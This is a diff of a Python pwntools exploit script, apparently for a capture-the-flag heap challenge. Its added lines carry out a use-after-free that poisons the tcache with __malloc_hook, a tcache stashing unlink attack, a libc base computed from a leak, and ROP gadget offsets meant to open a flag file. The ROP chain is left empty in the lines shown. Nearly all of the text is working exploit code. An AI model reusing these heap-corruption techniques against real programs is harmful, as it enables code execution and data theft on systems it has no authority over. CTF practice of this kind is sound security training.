@@ -69,31 +69,59 @@ def pwn():
 	ru("hero name: ")
 	libc_base = u64(rl()[:-1].ljust(8, b'\0')) - 0x1e4ca0
 	g_libc.address = libc_base
+	malloc_hook = g_libc.symbols["__malloc_hook"]
 	
-	log.success("heap@%#x\nlibc@%#x", heap_base, libc_base)
+	log.success("heap@%#x\nlibc@%#x\n__malloc_hook@%#x", heap_base, libc_base, malloc_hook)
 
+	# UAF: write __malloc_hook into tcache[0x220]
+	new(0, 'a'*0x210)
+	new(1, 'a'*0x210)
+	delete(0)
+	delete(1)
+	edit(1,flat([malloc_hook, heap_base + 0x10])) 
 	###############################
 	# tcache stashing unlink attack
 	###############################
 	for i in range(6):
-		new(0, 0xf0)
+		new(0, 'a'*0xf0)
 		delete(0)
 	for i in range(7):
-		new(1, 0x3f0)
-		new(2, 0x2f0)
+		new(1, 'a'*0x400)
+		delete(1)
 	
-	new(1, 0x2f0)
-	new(2, 0x2f0)
-	delete(1) # put chunk 0x300 into unsortedbin
+	new(0, 'a'*0x400) # ub1 to be split.
+	new(1, 'a'*0x400) # prevent adjacent chunks consolidation.
+	new(1, 'a'*0x400) # ub2 to be split.
+	new(2, 'a'*0x400) # prevent chunk merge into top chunk.
+	# split ub1, ub2 to generate the 1st 0x100 chunk.
+	delete(0)
+	new(0, 'a'*0x300) # chk1: the remainder was inserted into unsortedbin.
+	delete(1) 
+	new(0, 'a'*0x300) # split chk2, insert chk1 into smallbin.
+	new(0, 'a'*0x400) # insert chk2 into smallbin.
 
-	new(1, 0x3f0)
-	new(2, 0x3f0)
-	delete(1) # put chunk 0x400 into unsortedbin
+	# UAF: chk2->bk = target_ptr - off(fd) = target_ptr - 0x10
+	edit(1, flat(['a'*0x300, 0, 0x101, heap_base + (0x55555555c120 - 0x555555559000), heap_base + 0x1b]))
+
+	# trigger stashing unlink
+	new(2, 'a'*0xf0)
 	
-	# split ub to generate two 0x100 chunks.
-	new(1, 0x1f0)
-	new(2, 0x2f0)
+	###############################
+	# write __malloc_hook with ROP.
+	###############################
+	p_rsp = libc_base + 0x43db4 # add rsp, 0x148; ret
+	p_rdi = libc_base + 0x26542 # pop rdi; ret
+	p_rsi = libc_base + 0x26f9e # pop rsi; ret
+	p_rdx = libc_base + 0x12bda6 # pop rdx; ret
+	p_rax = libc_base + 0x47cf8 # pop rax; ret
+	backdoor("./flag")
+	backdoor(p64(p_rsp))
 
+	rop = flat([
+		# open("./flag")
+		
+	])
+	
 if ("__main__" == __name__):
 	debug_on()
 	pwn()
